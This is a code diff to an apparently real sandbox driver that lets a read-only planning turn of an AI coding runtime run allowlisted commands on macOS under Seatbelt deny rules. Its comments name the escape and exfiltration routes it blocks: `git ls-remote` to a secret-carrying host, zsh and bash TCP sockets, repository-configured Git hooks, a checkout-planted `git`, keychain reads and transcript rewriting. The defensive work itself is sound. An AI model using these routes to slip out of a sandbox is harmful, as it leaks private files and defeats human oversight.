@@ -9,6 +9,7 @@ import {
   realpathSync,
   rmSync,
   statSync,
+  symlinkSync,
 } from "node:fs";
 import { homedir, tmpdir } from "node:os";
 import { isAbsolute, join, sep } from "node:path";
@@ -26,6 +27,9 @@ import {
   type ConfinedVersionProbeLaunch,
 } from "../process/confinedVersionProbe";
 import {
+  confinedExecutableExecPaths,
+  DEFAULT_SANDBOX_PATH,
+  escapeSeatbeltPath,
   makeProcessConfinementLive,
   ProcessConfinementError,
   seatbeltAllowLiteralReadRule,
@@ -674,6 +678,237 @@ export function claudeLoginKeychainPath(): string {
 }
 
 /**
+ * Whether a Plan turn's runtime may run read-only commands on this platform.
+ *
+ * Only the Seatbelt profile can name the programs a shell may start. Linux
+ * Plan launches load the seccomp filter that refuses every process-creating
+ * fork (0068), so a shell there could start nothing and the Bash tool is not
+ * offered.
+ */
+export function claudePlanRunsCommands(platform: NodeJS.Platform = process.platform): boolean {
+  return platform === "darwin";
+}
+
+/**
+ * The shell a Plan turn's Bash tool runs in.
+ *
+ * The runtime's Bash tool refuses to start without bash or zsh ("No suitable
+ * shell found"), and `CLAUDE_CODE_SHELL` pins it to this one so the profile
+ * names a single shell. `/bin/sh` and `/bin/bash` stay refused: Git starts
+ * every configured command that carries arguments through `/bin/sh -c`, so
+ * without it a repository's `core.fsmonitor`, `core.pager`, textconv or
+ * `!`-alias cannot start, and bash's built-in `/dev/tcp` is not reachable.
+ */
+const CLAUDE_PLAN_SHELL = "/bin/zsh";
+
+/**
+ * The system programs a Plan turn's shell may run. Each one reads files and
+ * prints; none can write past the profile's write rules, and the ones that
+ * start programs (`find -exec`, `xargs`) start only programs on this list.
+ * `awk`'s `system()` goes through `/bin/sh`, which is refused.
+ */
+const CLAUDE_PLAN_SYSTEM_COMMANDS = [
+  "/bin/cat",
+  "/bin/ls",
+  "/bin/realpath",
+  "/usr/bin/awk",
+  "/usr/bin/basename",
+  "/usr/bin/cut",
+  "/usr/bin/diff",
+  "/usr/bin/dirname",
+  "/usr/bin/file",
+  "/usr/bin/find",
+  "/usr/bin/grep",
+  "/usr/bin/head",
+  "/usr/bin/sed",
+  "/usr/bin/sort",
+  "/usr/bin/stat",
+  "/usr/bin/tail",
+  "/usr/bin/tr",
+  "/usr/bin/uniq",
+  "/usr/bin/wc",
+  "/usr/bin/xargs",
+] as const;
+
+/** Programs looked up on the launch's `PATH`, as the shell would find them. */
+const CLAUDE_PLAN_SEARCHED_COMMANDS = ["git", "rg"] as const;
+
+/**
+ * The developer-tools shim macOS puts first on most `PATH`s. It is not Git: it
+ * looks up the active developer folder and, for an Xcode, runs `xcodebuild` to
+ * check its first-launch state before it starts the real Git. Measured on
+ * macOS 27.0.1 under this profile, every `git` call through it failed: first
+ * reading `/var/select/developer_dir`, which `/private` denies, and with that
+ * opened, with "couldn't spawn '.../usr/bin/xcodebuild'". The shim is
+ * therefore not allowed at all; the real Git is, and a `git` beside the
+ * launch's temporary directory, put first on `PATH`, points at it.
+ */
+const DEVELOPER_TOOLS_GIT_SHIM = "/usr/bin/git";
+
+/**
+ * The real Git the shim would start: the folder `DEVELOPER_DIR` names, then
+ * the `xcode-select` link, the default Xcode, and the Command Line Tools, the
+ * first that holds one. The link alone is not enough: on the measured host it
+ * named an Xcode that was no longer installed.
+ */
+function developerGit(environment: SpawnOptions["env"]): string | undefined {
+  return [
+    environment.DEVELOPER_DIR,
+    "/var/db/xcode_select_link",
+    "/Applications/Xcode.app/Contents/Developer",
+    "/Library/Developer/CommandLineTools",
+  ]
+    .filter((directory): directory is string => directory !== undefined && isAbsolute(directory))
+    .map((directory) => join(directory, "usr", "bin", "git"))
+    .find(isExecutableFile);
+}
+
+/**
+ * The executable files a Plan turn's shell may start, each in its literal and
+ * resolved form, since Seatbelt judges the resolved path, and the real Git to
+ * put first on `PATH` when the `git` the shell would find is the shim.
+ *
+ * A program found on `PATH` is dropped when it resolves into the checkout or
+ * any folder the launch may write: a checkout that ships its own `git` on a
+ * `PATH` entry would otherwise run its own code under the name of a read.
+ */
+function planCommandPrograms(
+  environment: SpawnOptions["env"],
+  confinedRoots: ReadonlyArray<string>,
+): { readonly programs: ReadonlyArray<string>; readonly gitBehindShim: string | undefined } {
+  const searchPath = (environment.PATH ?? "").split(":").filter((entry) => isAbsolute(entry));
+  let gitBehindShim: string | undefined;
+  const found = CLAUDE_PLAN_SEARCHED_COMMANDS.flatMap((name) => {
+    const first = searchPath.map((entry) => join(entry, name)).find(isExecutableFile);
+    if (first === undefined) return [];
+    if (name === "git" && first === DEVELOPER_TOOLS_GIT_SHIM) {
+      gitBehindShim = developerGit(environment);
+      return gitBehindShim === undefined ? [] : [gitBehindShim];
+    }
+    return [first];
+  });
+  const programs = new Set<string>();
+  for (const candidate of [CLAUDE_PLAN_SHELL, ...CLAUDE_PLAN_SYSTEM_COMMANDS, ...found]) {
+    if (!isExecutableFile(candidate)) continue;
+    let resolved: string;
+    try {
+      resolved = realpathSync(candidate);
+    } catch {
+      continue;
+    }
+    const insideConfinedRoot = [candidate, resolved].some((path) =>
+      confinedRoots.some((root) => path === root || path.startsWith(`${root}${sep}`)),
+    );
+    if (insideConfinedRoot) {
+      if (candidate === gitBehindShim) gitBehindShim = undefined;
+      continue;
+    }
+    programs.add(candidate);
+    programs.add(resolved);
+  }
+  return { programs: [...programs], gitBehindShim };
+}
+
+function isExecutableFile(path: string): boolean {
+  try {
+    if (!statSync(path).isFile()) return false;
+    accessSync(path, constants.X_OK);
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+function seatbeltAnyProcessPath(paths: ReadonlyArray<string>): string {
+  return `(require-any ${paths.map((path) => `(process-path "${escapeSeatbeltPath(path)}")`).join(" ")})`;
+}
+
+function seatbeltAnyLiteral(paths: ReadonlyArray<string>): string {
+  return `(require-any ${paths.map((path) => `(literal "${escapeSeatbeltPath(path)}")`).join(" ")})`;
+}
+
+/**
+ * The Seatbelt rules that let a Plan turn's shell run read-only commands
+ * without taking the runtime's own reach.
+ *
+ * A rule's `process-path` is the program of the process asking, so these
+ * rules hold the runtime's reach to the runtime's own image:
+ *
+ * - The account's state directories stay the runtime's to read. They hold
+ *   every session's transcript, from every checkout the account has opened,
+ *   which the driver keeps the file tools out of and a `cat` would not be.
+ * - Writes outside the launch's temporary directory stay the runtime's. The
+ *   session transcript and `sessions/` records are granted for the runtime
+ *   to keep its session; a command that rewrote the transcript could put
+ *   words in the person's mouth for a later, writing turn that resumes it.
+ *   `/dev` is left to the profile's own rules.
+ * - Network stays the runtime's, which calls its provider. A shell or a tool
+ *   it starts reaches no host, so `git ls-remote git://host/<secret>` or a
+ *   `zsh/net/tcp` socket cannot carry a checkout file anywhere.
+ * - The runtime's own program can be started only by `sandbox-exec`, for the
+ *   launch, and by the runtime itself. A shell that started a second runtime
+ *   would get that network and could be pointed at any host through its
+ *   environment.
+ * - `/usr/bin/security` and the login keychain file serve the runtime's
+ *   sign-in read, and a shell may neither run the one nor read the other.
+ *
+ * Measured on macOS 27.0.1: `process-path` in a `process-exec` rule names the
+ * caller, not the program being started (a rule denying `/bin/echo` for the
+ * caller `/bin/zsh` refused `zsh -c /bin/echo` and let `bash -c /bin/echo`
+ * run), and the launch's own exec is asked by `/usr/bin/sandbox-exec`.
+ */
+function planCommandRules(
+  runtimePrograms: ReadonlyArray<string>,
+  commandPrograms: ReadonlyArray<string>,
+  temporaryDirectory: string,
+  accountDirectories: ReadonlyArray<string>,
+): ReadonlyArray<string> {
+  const runtime = seatbeltAnyProcessPath(runtimePrograms);
+  return [
+    ...commandPrograms.map(seatbeltExecRule),
+    ...accountDirectories.map(
+      (directory) =>
+        `(deny file-read* (require-all (subpath "${escapeSeatbeltPath(directory)}") (require-not ${runtime})))`,
+    ),
+    `(deny file-write* (require-all (require-not ${runtime}) (require-not (subpath "${escapeSeatbeltPath(temporaryDirectory)}")) (require-not (subpath "/dev"))))`,
+    `(deny process-exec (require-all ${seatbeltAnyLiteral(runtimePrograms)} (require-not ${seatbeltAnyProcessPath([DEFAULT_SANDBOX_PATH, ...runtimePrograms])})))`,
+    `(deny network* (require-not ${runtime}))`,
+    `(deny process-exec (require-all (literal "/usr/bin/security") (require-not ${runtime})))`,
+    `(deny file-read* (require-all (literal "${escapeSeatbeltPath(claudeLoginKeychainPath())}") (require-not ${seatbeltAnyProcessPath(["/usr/bin/security", ...runtimePrograms])})))`,
+  ];
+}
+
+/**
+ * The environment a Plan turn's shell starts Git with.
+ *
+ * Git reads the system and global configuration and the repository's own,
+ * and a configured `core.fsmonitor` runs on every `git status` and `git diff`.
+ * These pin the fsmonitor off, skip the system and global files and the
+ * per-user ignore and attributes files, stop Git
+ * taking the optional index lock (which the profile would refuse anyway), and
+ * keep the pager and credential prompts out. They guard against a command
+ * started by accident; a command the model sets them aside for is still held
+ * by the profile, which refuses `/bin/sh` and every program not on the list.
+ */
+const CLAUDE_PLAN_GIT_ENVIRONMENT = {
+  GIT_CONFIG_NOSYSTEM: "1",
+  GIT_CONFIG_GLOBAL: "/dev/null",
+  GIT_CONFIG_COUNT: "3",
+  GIT_CONFIG_KEY_0: "core.fsmonitor",
+  GIT_CONFIG_VALUE_0: "false",
+  // Git reads these from `~/.config/git` when no configuration names them,
+  // and the profile denies the home folder: every `git diff` and `git status`
+  // printed "warning: unable to access '~/.config/git/ignore'".
+  GIT_CONFIG_KEY_1: "core.excludesFile",
+  GIT_CONFIG_VALUE_1: "/dev/null",
+  GIT_CONFIG_KEY_2: "core.attributesFile",
+  GIT_CONFIG_VALUE_2: "/dev/null",
+  GIT_OPTIONAL_LOCKS: "0",
+  GIT_PAGER: "cat",
+  GIT_TERMINAL_PROMPT: "0",
+} as const;
+
+/**
  * Wrap a Claude runtime launch in the shared confinement builder.
  *
  * The Agent SDK composes the launch, so this is the only point that holds both
@@ -747,11 +982,12 @@ function confineClaudeLaunch(
     // exits 44, item not found), and it signs in once the profile also allows
     // process-fork and read of the one file `login.keychain-db`. No shell, no
     // Keychain write and no other file in that folder is needed, so none is
-    // granted: `/bin/sh` stays refused, which keeps hooks and the Bash tool
-    // out. The cost is that the runtime may fork, may run `security`, which
-    // returns any Keychain item that trusts that tool, and may read the
-    // encrypted login keychain file. The driver refuses a file tool that names
-    // that folder, so the grant serves the sign-in read and not the model. A
+    // granted: `/bin/sh` stays refused, which keeps hooks out. The cost is
+    // that the runtime may fork, may run `security`, which returns any
+    // Keychain item that trusts that tool, and may read the encrypted login
+    // keychain file. The driver refuses a file tool that names that folder,
+    // and `planCommandRules` refuses both to the shell a Plan turn runs
+    // commands in, so the grant serves the sign-in read and not the model. A
     // launch that carries an API key reads nothing from the store and gets
     // none of this. Linux keeps the login in a file inside the account
     // directory, which the launch may rewrite (see `planStateWriteRoots`), and
@@ -780,6 +1016,40 @@ function confineClaudeLaunch(
           seatbeltAllowLiteralReadRule(claudeLoginKeychainPath()),
         ]
       : [];
+    const runsCommands = claudePlanRunsCommands();
+    const runtimePrograms = [
+      ...new Set(
+        [spawnOptions.env.PATH, process.env.PATH].flatMap((searchPath) =>
+          confinedExecutableExecPaths(spawnOptions.command, searchPath),
+        ),
+      ),
+    ];
+    const commands = runsCommands
+      ? planCommandPrograms(spawnOptions.env, [
+          boundRoot,
+          temporaryDirectory,
+          ...stateRoots.writeRoots,
+        ])
+      : undefined;
+    const commandRules =
+      commands === undefined
+        ? []
+        : planCommandRules(
+            runtimePrograms,
+            commands.programs,
+            temporaryDirectory,
+            stateRoots.readRoots,
+          );
+    // The shell finds `git` where the shim would have started it. The folder
+    // is the launch's own and goes with it.
+    let searchPath = spawnOptions.env.PATH;
+    if (commands?.gitBehindShim !== undefined) {
+      const gitFolder = join(temporaryDirectory, "bin");
+      mkdirSync(gitFolder, { mode: 0o700 });
+      symlinkSync(commands.gitBehindShim, join(gitFolder, "git"));
+      searchPath = searchPath === undefined ? gitFolder : `${gitFolder}:${searchPath}`;
+    }
+    const extraRules = [...keychainRules, ...commandRules];
     const launch = options.confinement.prepare({
       executable: spawnOptions.command,
       args: spawnOptions.args,
@@ -799,14 +1069,15 @@ function confineClaudeLaunch(
       ),
       // Plan is read-only at the sandbox, not only in the provider's permission
       // layer (0009): the checkout reads and never writes, and the runtime execs
-      // nothing but itself and, for a Keychain sign-in, `/usr/bin/security`.
-      // Measured on macOS 27, a session hook under this profile is refused with
+      // nothing but itself, `/usr/bin/security` for a Keychain sign-in, and on
+      // macOS the shell and read-only programs `planCommandRules` names.
+      // `/bin/sh` stays refused, so a session hook is still refused with
       // `EPERM: operation not permitted, posix_spawn '/bin/sh'`.
       writeBoundRoot: false,
       allowProcessExec: false,
-      allowProcessFork: readsSignInFromKeychain,
+      allowProcessFork: readsSignInFromKeychain || runsCommands,
       allowFileReadStar: true,
-      ...(keychainRules.length === 0 ? {} : { extraRules: keychainRules }),
+      ...(extraRules.length === 0 ? {} : { extraRules }),
     });
     return {
       spawnOptions: {
@@ -821,6 +1092,10 @@ function confineClaudeLaunch(
           ...spawnOptions.env,
           TMPDIR: temporaryDirectory,
           CLAUDE_CODE_TMPDIR: temporaryDirectory,
+          ...(runsCommands
+            ? { CLAUDE_CODE_SHELL: CLAUDE_PLAN_SHELL, ...CLAUDE_PLAN_GIT_ENVIRONMENT }
+            : {}),
+          ...(searchPath === undefined ? {} : { PATH: searchPath }),
         },
       },
       release,
